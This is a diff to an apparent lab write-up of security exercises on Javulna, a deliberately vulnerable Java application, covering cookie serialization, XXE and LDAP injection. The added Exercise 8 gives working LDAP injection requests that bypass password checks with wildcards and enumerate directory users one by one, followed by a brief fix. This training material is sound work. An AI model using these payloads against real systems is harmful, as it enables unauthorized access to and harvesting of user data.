@@ -64,6 +64,7 @@ We can use another way to serialize and deserialize the _User_ objects. We could
 
 Additionally we could only serialize non-sensitive data and omit the sensitive data like the _password_ property.
 And on top of that we could opt to use another encoding schema than Base64 to prevent a malicious user to decode the cookie and find out what value it contains.
+
 # Exercise 7
 The method to create a movie by passing an xml payload as a string parameter of the http request is vulnerable to xxe.
 It allows us to pass a xml document that references a external entity and put its content in the movie we create. Since the request returns us the movie data, we can use this exploit to retrieve any data from the remote system or to which the remote system has access.
@@ -89,3 +90,30 @@ DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 ```
 
+# Exercise 8
+The LDAP Service is vulnerable to LDAP injection.
+
+We can use a wildcard to match the password to find user data without knowing the user's password:
+>{{javulna_host}}/rest/ldap?username=kriszta&password=*
+
+We can also use wildcards in the username to find user's whose name starts with a given letter
+>{{javulna_host}}/rest/ldap?username=j*&password=*
+
+## Find all data
+By passing a wildcard for both username and password, we get the first user in the directory:
+>{{javulna_host}}/rest/ldap?username=*&password=*
+
+So we find **aladar**.
+
+Now we know the first user, we can search for the first user alfabetically after 'aladar':
+>{{javulna_host}}/rest/ldap?username=*)(uid>=aladar0))(|(uid=*&password=*
+
+Now we know the next user is **geza**
+
+We can keep repeating this until no user data is found any more:
+>{{javulna_host}}/rest/ldap?username=*)(uid>=geza0))(|(uid=*&password=*
+
+>{{javulna_host}}/rest/ldap?username=*)(uid>=kriszta0))(|(uid=*&password=*
+
+## Fix
+Use a LDAP filter builder to create a search filter based on exact match for username and password.
